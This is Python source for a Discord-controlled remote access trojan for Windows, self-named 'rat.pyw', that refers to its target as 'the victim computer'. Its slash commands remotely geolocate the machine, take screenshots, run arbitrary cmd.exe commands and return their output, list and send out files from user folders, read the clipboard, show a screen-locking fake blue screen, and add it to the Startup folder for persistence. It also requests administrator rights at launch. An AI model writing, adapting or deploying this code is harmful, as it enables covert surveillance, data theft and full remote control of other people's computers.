import discord
from discord import app_commands
import requests
import mss
from PIL import Image
import ctypes
from ctypes import wintypes
import os
import subprocess
import tempfile
import tkinter as tk
import asyncio
import random
import sys
from PIL import Image, ImageTk


def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except Exception:
        return False


def run_as_admin():
    executable = sys.executable
    script = os.path.abspath(__file__)
    params = f'"{script}"'

    ctypes.windll.shell32.ShellExecuteW(
        None,
        "runas",
        executable,
        params,
        None,
        1
    )


# ============================================================
# CONFIG
# ============================================================

BOT_TOKEN = "PUT TOKAN HERE"

GUILD_ID = PUT CHANEL ID HERE


# ============================================================
# BOT
# ============================================================

intents = discord.Intents.default()

client = discord.Client(intents=intents)
tree = app_commands.CommandTree(client)


# ============================================================
# /location
# ============================================================

@tree.command(
    name="location",
    description="Shows IP and approximate location"
)
async def location(interaction: discord.Interaction):

    await interaction.response.defer()

    try:
        ip_response = requests.get(
            "https://api.ipify.org?format=json",
            timeout=10
        )

        ip_response.raise_for_status()
        ip = ip_response.json()["ip"]

        location_response = requests.get(
            f"https://ipwho.is/{ip}",
            timeout=10
        )

        location_response.raise_for_status()
        data = location_response.json()

        if not data.get("success", False):
            raise Exception("Location API couldn't identify the IP")

        country = data.get("country") or "Unknown"
        region = data.get("region") or "Unknown"
        city = data.get("city") or "Unknown"

        isp = (
            data.get("connection", {}).get("isp")
            or "Unknown"
        )

        embed = discord.Embed(
            title=" PC Location",
            description=f"**IP:** `{ip}`",
            color=discord.Color.blue()
        )

        embed.add_field(
            name="Country",
            value=country,
            inline=True
        )

        embed.add_field(
            name="Region",
            value=region,
            inline=True
        )

        embed.add_field(
            name="City",
            value=city,
            inline=True
        )

        embed.add_field(
            name="ISP",
            value=isp,
            inline=False
        )

        await interaction.followup.send(embed=embed)

    except Exception as e:
        await interaction.followup.send(
            f" Couldn't get location: `{e}`"
        )


# ============================================================
# /screenshot
# ============================================================

@tree.command(
    name="screenshot",
    description="Take a screenshot"
)
async def screenshot(interaction: discord.Interaction):

    await interaction.response.defer()

    filename = None

    try:

        def take_screenshot():

            with mss.mss() as sct:

                monitor = sct.monitors[1]
                shot = sct.grab(monitor)

                with tempfile.NamedTemporaryFile(
                    suffix=".png",
                    delete=False
                ) as f:
                    path = f.name

                image = Image.frombytes(
                    "RGB",
                    shot.size,
                    shot.rgb
                )

                image.save(path)

                return path

        filename = await asyncio.to_thread(
            take_screenshot
        )

        await interaction.followup.send(
            " Screenshot:",
            file=discord.File(
                filename,
                filename="screenshot.png"
            )
        )

    except Exception as e:

        try:
            await interaction.followup.send(
                f" Screenshot failed: `{e}`"
            )
        except Exception:
            print(f"Screenshot error: {e}")

    finally:

        if filename and os.path.exists(filename):

            try:
                os.remove(filename)
            except OSError:
                pass


# ============================================================
# /wallpaper
# ============================================================

@tree.command(
    name="wallpaper",
    description="Set wallpaper"
)
async def wallpaper(
    interaction: discord.Interaction,
    image: discord.Attachment
):

    await interaction.response.defer()

    allowed_extensions = (
        ".png",
        ".jpg",
        ".jpeg",
        ".bmp"
    )

    if not image.filename.lower().endswith(
        allowed_extensions
    ):

        await interaction.followup.send(
            " Please upload a PNG, JPG, JPEG or BMP image."
        )
        return

    temp_path = None
    bmp_path = None

    try:

        temp_path = os.path.join(
            tempfile.gettempdir(),
            "discord_wallpaper_original"
        )

        bmp_path = os.path.join(
            tempfile.gettempdir(),
            "discord_wallpaper.bmp"
        )

        await image.save(temp_path)

        img = Image.open(temp_path)

        img.convert("RGB").save(
            bmp_path
        )

        ctypes.windll.user32.SystemParametersInfoW(
            20,
            0,
            bmp_path,
            3
        )

        await interaction.followup.send(
            " Wallpaper changed."
        )

    except Exception as e:

        await interaction.followup.send(
            f" Wallpaper change failed: `{e}`"
        )

    finally:

        if temp_path and os.path.exists(temp_path):

            try:
                os.remove(temp_path)
            except OSError:
                pass


# ============================================================
# /message
# ============================================================

@tree.command(
    name="message",
    description="Show a message on the PC"
)
async def message(
    interaction: discord.Interaction,
    message_text: str
):

    await interaction.response.send_message(
        " Showing message..."
    )

    def show_message():

        root = tk.Tk()

        root.title("Message")
        root.geometry("600x300")
        root.resizable(False, False)

        root.attributes("-topmost", True)

        label = tk.Label(
            root,
            text=message_text,
            font=("Segoe UI", 20),
            wraplength=520,
            justify="center"
        )

        label.pack(
            expand=True,
            padx=30,
            pady=30
        )

        button = tk.Button(
            root,
            text="Close",
            font=("Segoe UI", 12),
            command=root.destroy
        )

        button.pack(
            pady=(0, 20)
        )

        root.mainloop()

    await asyncio.to_thread(show_message)

# ============================================================
# FAKE BSOD
# ============================================================

def show_fake_bsod():

    root = tk.Tk()

    root.title("Windows")

    screen_width = root.winfo_screenwidth()
    screen_height = root.winfo_screenheight()

    root.geometry(
        f"{screen_width}x{screen_height}+0+0"
    )

    root.attributes(
        "-fullscreen",
        True
    )

    root.attributes(
        "-topmost",
        True
    )

    root.lift()
    root.focus_force()

    root.configure(
        bg="#10BCEB"
    )

    root.overrideredirect(True)

    frame = tk.Frame(
        root,
        bg="#10BCEB"
    )

    frame.pack(
        expand=True,
        fill="both"
    )

    sad_face = tk.Label(
        frame,
        text=":(",
        font=("Segoe UI Light", 72),
        fg="white",
        bg="#10BCEB"
    )

    sad_face.place(
        x=155,
        y=235
    )

    message = tk.Label(
        frame,
        text=(
            "Your PC ran into a problem and needs to restart. We're\n"
            "just collecting some error info, and then we'll restart for\n"
            "you."
        ),
        font=("Segoe UI", 26),
        fg="white",
        bg="#10BCEB",
        justify="left"
    )

    message.place(
        x=155,
        y=430
    )

    percent = 8

    percent_label = tk.Label(
        frame,
        text="8% complete",
        font=("Segoe UI", 26),
        fg="white",
        bg="#10BCEB"
    )

    percent_label.place(
        x=155,
        y=590
    )

    qr = tk.Canvas(
        frame,
        width=95,
        height=95,
        bg="white",
        highlightthickness=0
    )

    qr.place(
        x=155,
        y=668
    )

    random.seed(12345)

    for y in range(0, 95, 5):

        for x in range(0, 95, 5):

            if random.choice([True, False]):

                qr.create_rectangle(
                    x,
                    y,
                    x + 4,
                    y + 4,
                    fill="#00B7E8",
                    outline=""
                )

    info = tk.Label(
        frame,
        text=(
            "For more information about this issue and possible fixes, "
            "visit https://www.windows.com/stopcode\n\n"
            "If you call a support person, give them this info:\n\n"
            "Stop code: CRITICAL_PROCESS_DIED"
        ),
        font=("Segoe UI", 10),
        fg="white",
        bg="#10BCEB",
        justify="left"
    )

    info.place(
        x=265,
        y=670
    )

    def increase_percent():

        nonlocal percent

        if percent < 100:

            percent += 1

            percent_label.config(
                text=f"{percent}% complete"
            )

            root.after(
                10000,
                increase_percent
            )

    root.after(
        10000,
        increase_percent
    )

    def close_on_pound(event):

        if event.char == "£":

            root.destroy()

    root.bind_all(
        "<KeyPress>",
        close_on_pound
    )

    root.protocol(
        "WM_DELETE_WINDOW",
        lambda: None
    )

    root.mainloop()


# ============================================================
# /blue
# ============================================================

@tree.command(
    name="blue",
    description="Show a fake blue screen"
)
async def blue(
    interaction: discord.Interaction
):

    await interaction.response.send_message(
        " Fake Crash launching..."
    )

    await asyncio.to_thread(
        show_fake_bsod
    )

# ============================================================
# /run
# ============================================================

RUNNABLE_FILES = {
    # windows
    "notepad": r"C:\Windows\System32\notepad.exe",
    "calculator": r"C:\Windows\System32\calc.exe",
    "paint": r"C:\Users\brodie\AppData\Local\Microsoft\WindowsApps\mspaint.exe",
    "explorer": r"C:\Windows\explorer.exe",
    "task manager": r"C:\Windows\System32\Taskmgr.exe",
    "control panel": r"C:\Windows\System32\control.exe",
    "cmd": r"C:\Windows\System32\cmd.exe",
    "powershell": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
    "snipping tool": r"C:\Users\brodie\AppData\Local\Microsoft\WindowsApps\SnippingTool.exe",
    "registry editor": r"C:\Windows\regedit.exe",
    "spotify": r"C:\Users\brodie\AppData\Local\Microsoft\WindowsApps\Spotify.exe",
    "vscode": r"C:\Users\brodie\AppData\Local\Programs\Microsoft VS Code\Code.exe",

    # browsers
    "chrome": r"C:\Program Files\Google\Chrome\Application\chrome.exe",
    "edge": r"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe",
    "firefox": r"C:\Program Files\Mozilla Firefox\firefox.exe",
    "brave": r"C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe",

    # norm apps
    "steam": r"C:\Program Files (x86)\Steam\steam.exe",
    "spotify": r"C:\Users\YOURNAME\AppData\Roaming\Spotify\Spotify.exe",
    "discord": r"C:\Users\YOURNAME\AppData\Local\Discord\Update.exe",
    "vscode": r"C:\Users\YOURNAME\AppData\Local\Programs\Microsoft VS Code\Code.exe",
    "obs": r"C:\Program Files\obs-studio\bin\64bit\obs64.exe",
    "7zip": r"C:\Program Files\7-Zip\7zFM.exe",
}

@tree.command(
    name="run",
    description="Run any program, file, or shell command"
)
@app_commands.describe(
    target="Path, app, or command to run"
)
async def run(
    interaction: discord.Interaction,
    target: str
):

    await interaction.response.defer()

    try:

        def launch_target():
            if os.path.exists(target):
                os.startfile(target)
                return

            user_home = os.path.expanduser("~")
            search_dirs = [
                os.getcwd(),
                os.path.join(user_home, "Desktop"),
                os.path.join(user_home, "Downloads"),
                os.path.join(user_home, "Documents")
            ]

            normalized_target = target.lower()
            for directory in search_dirs:
                try:
                    for entry in os.listdir(directory):
                        if entry.lower() == normalized_target:
                            path = os.path.join(directory, entry)
                            if os.path.exists(path):
                                os.startfile(path)
                                return
                except OSError:
                    continue

            quoted_target = target.replace('"', '\\"')
            subprocess.Popen(
                f'start "" "{quoted_target}"',
                shell=True
            )

        await asyncio.to_thread(launch_target)

        await interaction.followup.send(
            f"▶ Ran `{target}`."
        )

    except Exception as e:
        await interaction.followup.send(
            f" Couldn't run it: `{e}`"
        )


# ============================================================
# /cmd

@tree.command(
    name="cmd",
    description="Run a command in cmd"
)
@app_commands.describe(
    command="Command text to execute"
)
async def cmd(
    interaction: discord.Interaction,
    command: str
):

    await interaction.response.defer()

    temp_path = None

    try:

        def run_cmd():

            completed = subprocess.run(
                ["cmd.exe", "/c", command],
                capture_output=True,
                text=True,
                timeout=30
            )

            return (
                completed.returncode,
                completed.stdout or "",
                completed.stderr or ""
            )

        returncode, stdout, stderr = await asyncio.to_thread(
            run_cmd
        )

        output_text = ""

        if stdout:
            output_text += f"Output:\n{stdout}\n"

        if stderr:
            output_text += f"Error:\n{stderr}\n"

        if not output_text:
            await interaction.followup.send(
                f" Command finished with exit code {returncode}."
            )
            return

        output_text = output_text.strip()

        if len(output_text) > 1900:
            temp_path = os.path.join(
                tempfile.gettempdir(),
                "cmd_output.txt"
            )

            with open(temp_path, "w", encoding="utf-8") as f:
                f.write(output_text)

            await interaction.followup.send(
                " Output too long, sending as a file:",
                file=discord.File(
                    temp_path,
                    filename="cmd_output.txt"
                )
            )

        else:
            await interaction.followup.send(
                f"```cmd\n{output_text}\n```"
            )

    except Exception as e:
        await interaction.followup.send(
            f" Couldn't run command: `{e}`"
        )

    finally:
        if temp_path and os.path.exists(temp_path):
            try:
                os.remove(temp_path)
            except OSError:
                pass


# ============================================================
# /showimage
# ============================================================

@tree.command(
    name="showimage",
    description="show a image on the PC"
)
async def showimage(
    interaction: discord.Interaction,
    image: discord.Attachment
):

    allowed_extensions = (
        ".png",
        ".jpg",
        ".jpeg",
        ".bmp",
        ".webp"
    )

    if not image.filename.lower().endswith(allowed_extensions):
        await interaction.response.send_message(
            " Please upload a PNG, JPG, JPEG, BMP or WEBP image.",
            ephemeral=True
        )
        return

    await interaction.response.send_message(
        " Showing image..."
    )

    temp_path = os.path.join(
        tempfile.gettempdir(),
        "discord_show_image.png"
    )

    try:
        await image.save(temp_path)

        def display_image():

            root = tk.Tk()

            root.title("Image")
            root.attributes("-topmost", True)
            root.configure(bg="black")

            img = Image.open(temp_path)
            img.thumbnail((1000, 700))

            photo = ImageTk.PhotoImage(img)

            label = tk.Label(
                root,
                image=photo,
                bg="black"
            )

            label.image = photo
            label.pack(
                padx=10,
                pady=10
            )

            button = tk.Button(
                root,
                text="Close",
                command=root.destroy
            )

            button.pack(
                pady=(0, 10)
            )

            root.bind(
                "<Escape>",
                lambda event: root.destroy()
            )

            root.mainloop()

        await asyncio.to_thread(display_image)

    except Exception as e:

        await interaction.followup.send(
            f" Couldn't display image: `{e}`"
        )

    finally:

        if os.path.exists(temp_path):
            try:
                os.remove(temp_path)
            except OSError:
                pass

# ============================================================
# /upload

@tree.command(
    name="upload",
    description="Upload a file and save it to the Downloads folder"
)
async def upload(
    interaction: discord.Interaction,
    file: discord.Attachment
):

    await interaction.response.defer()

    try:
        downloads_dir = os.path.join(
            os.path.expanduser("~"),
            "Downloads"
        )

        os.makedirs(downloads_dir, exist_ok=True)

        local_path = os.path.join(
            downloads_dir,
            file.filename
        )

        await file.save(local_path)

        await interaction.followup.send(
            f" Saved `{file.filename}` to `{local_path}`"
        )

    except Exception as e:
        await interaction.followup.send(
            f" Upload failed: `{e}`"
        )


# ============================================================
# /file

@tree.command(
    name="file",
    description="Choose a folder and list its files"
)
@app_commands.choices(
    folder=[
        app_commands.Choice(name="Desktop", value="desktop"),
        app_commands.Choice(name="Downloads", value="downloads"),
        app_commands.Choice(name="Documents", value="documents")
    ]
)
async def file(
    interaction: discord.Interaction,
    folder: app_commands.Choice[str]
):

    await interaction.response.defer()

    user_home = os.path.expanduser("~")
    paths = {
        "desktop": os.path.join(user_home, "Desktop"),
        "downloads": os.path.join(user_home, "Downloads"),
        "documents": os.path.join(user_home, "Documents")
    }

    folder_path = paths.get(folder.value)

    if not folder_path or not os.path.isdir(folder_path):
        await interaction.followup.send(
            f" Folder `{folder.name}` does not exist."
        )
        return

    try:
        file_names = sorted(
            f for f in os.listdir(folder_path)
            if os.path.isfile(os.path.join(folder_path, f))
        )

        if not file_names:
            await interaction.followup.send(
                f" No files found in `{folder.name}`."
            )
            return

        output = "\n".join(file_names)

        if len(output) > 1900:
            temp_path = os.path.join(
                tempfile.gettempdir(),
                f"{folder.value}_files.txt"
            )

            with open(temp_path, "w", encoding="utf-8") as f:
                f.write(output)

            await interaction.followup.send(
                f" {folder.name} file list:",
                file=discord.File(
                    temp_path,
                    filename=f"{folder.value}_files.txt"
                )
            )

            try:
                os.remove(temp_path)
            except OSError:
                pass

        else:
            await interaction.followup.send(
                f" Files in `{folder.name}`:\n```\n{output}\n```"
            )

    except Exception as e:
        await interaction.followup.send(
            f" Couldn't list files: `{e}`"
        )


# ============================================================
# /export

@tree.command(
    name="export",
    description="save a file from Desktop, Downloads, or Documents"
)
@app_commands.describe(
    folder="Choose the folder where the file is located",
    filename="Name of the file to export"
)
@app_commands.choices(
    folder=[
        app_commands.Choice(name="Desktop", value="desktop"),
        app_commands.Choice(name="Downloads", value="downloads"),
        app_commands.Choice(name="Documents", value="documents")
    ]
)
async def export(
    interaction: discord.Interaction,
    folder: app_commands.Choice[str],
    filename: str
):

    await interaction.response.defer()

    user_home = os.path.expanduser("~")
    paths = {
        "desktop": os.path.join(user_home, "Desktop"),
        "downloads": os.path.join(user_home, "Downloads"),
        "documents": os.path.join(user_home, "Documents")
    }

    folder_path = paths.get(folder.value)

    if not folder_path or not os.path.isdir(folder_path):
        await interaction.followup.send(
            f" Folder `{folder.name}` does not exist."
        )
        return

    file_path = os.path.join(folder_path, filename)

    if not os.path.isfile(file_path):
        await interaction.followup.send(
            f" File `{filename}` not found in `{folder.name}`."
        )
        return

    try:
        await interaction.followup.send(
            f" Sending `{filename}` from `{folder.name}`...",
            file=discord.File(
                file_path,
                filename=os.path.basename(file_path)
            )
        )
    except Exception as e:
        await interaction.followup.send(
            f" Couldn't send file: `{e}`"
        )


# ============================================================
# /say

@tree.command(
    name="say",
    description="Speak text out loud on the victim computer"
)
async def say(
    interaction: discord.Interaction,
    text: str
):

    await interaction.response.defer()

    if not text.strip():
        await interaction.followup.send(
            " Please provide text to speak."
        )
        return

    if len(text) > 1000:
        await interaction.followup.send(
            " Text is too long. Please keep it under 1000 characters."
        )
        return

    try:

        def quote_powershell_string(value):
            return value.replace("'", "''")

        def speak_text():
            quoted = quote_powershell_string(text)
            ps_command = (
                "Add-Type -AssemblyName System.Speech; "
                "$s = New-Object System.Speech.Synthesis.SpeechSynthesizer; "
                "$s.Volume = 100; $s.Rate = 0; "
                f"$s.Speak('{quoted}');"
            )

            startupinfo = None
            if os.name == "nt":
                startupinfo = subprocess.STARTUPINFO()
                startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW

            subprocess.Popen(
                ["powershell.exe", "-NoProfile", "-Command", ps_command],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                startupinfo=startupinfo
            )

        await asyncio.to_thread(speak_text)

        await interaction.followup.send(
            f" Speaking on the computer."
        )

    except Exception as e:
        await interaction.followup.send(
            f" Couldn't speak text: `{e}`"
        )


# ============================================================
# /clipboard
# ============================================================

def get_clipboard_text():
    CF_UNICODETEXT = 13

    user32 = ctypes.WinDLL("user32", use_last_error=True)
    kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)

    user32.OpenClipboard.argtypes = [wintypes.HWND]
    user32.OpenClipboard.restype = wintypes.BOOL

    user32.GetClipboardData.argtypes = [wintypes.UINT]
    user32.GetClipboardData.restype = wintypes.HANDLE

    user32.CloseClipboard.argtypes = []
    user32.CloseClipboard.restype = wintypes.BOOL

    kernel32.GlobalLock.argtypes = [wintypes.HGLOBAL]
    kernel32.GlobalLock.restype = ctypes.c_void_p

    kernel32.GlobalUnlock.argtypes = [wintypes.HGLOBAL]
    kernel32.GlobalUnlock.restype = wintypes.BOOL

    if not user32.OpenClipboard(None):
        raise ctypes.WinError(ctypes.get_last_error())

    try:
        handle = user32.GetClipboardData(CF_UNICODETEXT)

        if not handle:
            return ""

        pointer = kernel32.GlobalLock(handle)

        if not pointer:
            raise ctypes.WinError(ctypes.get_last_error())

        try:
            return ctypes.wstring_at(pointer)
        finally:
            kernel32.GlobalUnlock(handle)

    finally:
        user32.CloseClipboard()


# Local test:
try:
    clipboard_text = get_clipboard_text()

    if clipboard_text:
        print(" Clipboard content:")
        print(clipboard_text)
    else:
        print(" Clipboard is empty.")

except Exception as e:
    print(f" Couldn't read clipboard: {e}")

# ============================================================
# /startup
# ============================================================

STARTUP_BATCH_NAME = "rat.pyw"


def get_startup_folder():
    appdata = os.environ.get("APPDATA")
    if appdata:
        return os.path.join(
            appdata,
            "Microsoft",
            "Windows",
            "Start Menu",
            "Programs",
            "Startup"
        )

    return os.path.join(
        os.path.expanduser("~"),
        "AppData",
        "Roaming",
        "Microsoft",
        "Windows",
        "Start Menu",
        "Programs",
        "Startup"
    )


def create_startup_entry():

    startup_folder = get_startup_folder()
    os.makedirs(startup_folder, exist_ok=True)

    script_path = os.path.abspath(__file__)
    python_executable = os.path.abspath(sys.executable)

    startup_batch_path = os.path.join(
        startup_folder,
        STARTUP_BATCH_NAME
    )

    batch_content = (
        "@echo off\r\n"
        f'"{python_executable}" "{script_path}" %*\r\n'
    )

    with open(startup_batch_path, "w", encoding="utf-8") as f:
        f.write(batch_content)

    return startup_batch_path


@tree.command(
    name="startup",
    description="Add this app to Windows startup"
)
async def startup(interaction: discord.Interaction):

    await interaction.response.defer()

    try:
        startup_batch_path = create_startup_entry()

        await interaction.followup.send(
            f" Added to startup. Launcher created at `{startup_batch_path}`"
        )

    except Exception as e:
        await interaction.followup.send(
            f" Couldn't add to startup: `{e}`"
        )


# ============================================================
# /status
# ============================================================

@tree.command(
    name="status",
    description="Show the bot connection status"
)
async def status(interaction: discord.Interaction):

    latency = round(client.latency * 1000)

    embed = discord.Embed(
        title="Bot Status",
        color=discord.Color.green()
    )

    embed.add_field(
        name="Connection",
        value="Online",
        inline=True
    )

    embed.add_field(
        name="Latency",
        value=f"{latency} ms",
        inline=True
    )

    await interaction.response.send_message(
        embed=embed
    )


# ============================================================
# READY
# ============================================================

@client.event
async def on_ready():

    try:

        guild = discord.Object(
            id=GUILD_ID
        )

        tree.copy_global_to(
            guild=guild
        )

        synced = await tree.sync(
            guild=guild
        )

        print(
            f"Logged in as: {client.user}"
        )

        print(
            f"Synced {len(synced)} commands:"
        )

        for command in synced:

            print(
                f"  /{command.name}"
            )

        connected_guild = client.get_guild(GUILD_ID)

        if connected_guild is not None:
            channel = connected_guild.system_channel

            if channel is None:
                channel = next(
                    (
                        ch for ch in connected_guild.text_channels
                        if ch.permissions_for(connected_guild.me).send_messages
                    ),
                    None
                )

            if channel is not None:
                try:
                    await channel.send("Connected.")
                except Exception as e:
                    print(f"Failed to send connected message: {e}")

    except Exception as e:

        print(
            f" Failed to sync commands: {e}"
        )


# ============================================================
# /help
# ============================================================

@tree.command(
    name="help",
    description="Show all available commands"
)
async def help_command(interaction: discord.Interaction):

    embed = discord.Embed(
        title="Bot Commands",
        description="Here are the available commands:",
        color=discord.Color.blue()
    )

    embed.add_field(
        name="/location",
        value="Show the PC's public IP and approximate location.",
        inline=False
    )

    embed.add_field(
        name="/screenshot",
        value="Take a screenshot of the primary monitor.",
        inline=False
    )

    embed.add_field(
        name="/wallpaper",
        value="Change the Windows wallpaper.",
        inline=False
    )

    embed.add_field(
        name="/message",
        value="Display a message window on the PC.",
        inline=False
    )

    embed.add_field(
        name="/showimage",
        value="Display an uploaded image on the PC.",
        inline=False
    )

    embed.add_field(
        name="/file",
        value="Choose Desktop, Downloads, or Documents and list the files there.",
        inline=False
    )

    embed.add_field(
        name="/export",
        value="Send a file from Desktop, Downloads, or Documents.",
        inline=False
    )

    embed.add_field(
        name="/cmd",
        value="Run a command through cmd.exe and return the output.",
        inline=False
    )

    embed.add_field(
        name="/say",
        value="Speak the provided text out loud on the computer.",
        inline=False
    )

    embed.add_field(
        name="/clipboard",
        value="Read and send back the current clipboard text.",
        inline=False
    )

    embed.add_field(
        name="/blue",
        value="Show the fake Windows blue screen.",
        inline=False
    )

    embed.add_field(
        name="/run",
        value="Open an approved application.",
        inline=False
    )

    embed.add_field(
        name="/startup",
        value="Add this app to Windows startup.",
        inline=False
    )

    embed.add_field(
        name="/status",
        value="Show the bot connection status.",
        inline=False
    )

    embed.add_field(
        name="/upload",
        value="Test a Discord file upload.",
        inline=False
    )

    await interaction.response.send_message(
        embed=embed
    )

# ============================================================
# START
# ============================================================

if __name__ == "__main__":

    if not is_admin():
        try:
            run_as_admin()
        except Exception as e:
            print(f"Could not elevate to administrator: {e}")
        sys.exit(0)

    try:

        client.run(
            BOT_TOKEN
        )

    except discord.LoginFailure:

        print(
            " Invalid bot token."
        )

        print(
            "Reset your token in the Discord Developer Portal."
        )

    except Exception as e:

        print(
            f" Bot crashed: {e}"
        )

    input(
        "\nPress Enter to close..."
    )